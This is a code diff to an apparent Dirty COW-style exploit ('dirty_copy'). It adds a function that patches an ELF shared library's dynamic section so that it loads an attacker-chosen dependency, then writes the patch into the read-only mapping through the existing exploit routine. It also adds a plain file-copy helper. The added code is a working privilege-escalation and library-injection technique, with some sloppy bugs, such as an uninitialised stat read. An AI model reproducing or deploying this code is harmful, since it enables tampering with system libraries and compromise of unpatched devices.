@@ -3,6 +3,7 @@
 //
 
 #include "dirty_copy.h"
+#include "elf_parser.h"
 
 pid_t g_pid;
 
@@ -197,6 +198,108 @@ static void exploit(struct mem_arg *mem_arg) {
   }
 
   LOGV("result: %i %p=%lx", g_pid, (void *) mem_arg->offset, *(unsigned long *) mem_arg->offset);
+}
+
+int inject_dependency_into_library(char* src_path, char* dependency_name)
+{
+  struct mem_arg mem_arg;
+  struct stat st;
+  struct stat st2;
+
+  int f=open(src_path, O_RDONLY);
+  if (f == -1) {
+    LOGV("could not open %s", src_path);
+    return 0;
+  }
+  if (fstat(f, &st) == -1) {
+    LOGV("could not open %s", src_path);
+    return 0;
+  }
+
+  size_t size = st.st_size;
+  LOGV("size %d\n\n",size);
+
+  mem_arg.patch = malloc(size);
+  if (mem_arg.patch == NULL)
+  {
+    LOGV("malloc");
+  }
+
+  memset(mem_arg.patch, 0, size);
+
+  read(f, mem_arg.patch, st2.st_size);
+
+  struct dyn_info info = {
+      0, 0, 0
+  };
+  get_elf_info((struct elf_header*)mem_arg.patch, &info);
+  printf("dyn_info: 0x%lx 0x%lx 0x%lx\n", info.str_table_addr, info.dependency_offset_addr, info.llibname_offset_addr);
+
+  printf("base address: 0x%lx\n", (unsigned long)mem_arg.patch);
+  unsigned long strtable_arrd_value = *((unsigned long*)(mem_arg.patch + info.str_table_addr + 4));
+  printf("str_table_addr_value: 0x%lx\n", strtable_arrd_value);
+  unsigned long llibname_offset_addr_value = *((unsigned long*)(mem_arg.patch + info.llibname_offset_addr + 4));
+  printf("lbiname_value: 0x%lx\n", *((unsigned long*)(mem_arg.patch + info.llibname_offset_addr)));
+  printf("llibname_offset_addr_value: 0x%lx\n", llibname_offset_addr_value);
+  char* libname = (char*)(mem_arg.patch + strtable_arrd_value + llibname_offset_addr_value);
+  printf("libname: %s\n", libname);
+
+  *((unsigned long*)(mem_arg.patch + info.llibname_offset_addr)) = 1;
+  strcpy(libname, dependency_name);
+
+  mem_arg.patch_size = size;
+
+  void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
+  if (map == MAP_FAILED) {
+    LOGV("mmap");
+    return 0;
+  }
+
+  LOGV("[*] mmap %p", map);
+
+  mem_arg.offset = map;
+
+  exploit(&mem_arg);
+
+  close(f);
+
+  return 0;
+}
+
+int copy_file(char* src_path, char* dst_path)
+{
+  int fd = open(src_path, O_RDONLY);
+  if (fd == -1)
+  {
+    printf("unable to open %s: %s\n", src_path, strerror(errno));
+  }
+  int fd1 = open(dst_path, O_WRONLY | O_CREAT);
+  if (fd1 == -1)
+  {
+    printf("unable to open %s: %s\n", dst_path, strerror(errno));
+  }
+
+  int bufsize = 4096;
+  void* buf = (void*)malloc(bufsize);
+  int readed = 0;
+  do {
+    readed = read(fd, buf, bufsize);
+    if (readed > 0)
+    {
+      int written = write (fd1, buf, readed);
+      printf("written %d\n", written);
+      if (written == -1)
+      {
+        printf("unable to write: %s\n", strerror(errno));
+        return -1;
+      }
+    }
+
+    printf("%d readed\n", readed);
+  } while(readed > 0);
+
+  close(fd);
+  close(fd1);
 }
 
 int dirty_copy(const char *src_path, const char *dst_path) {
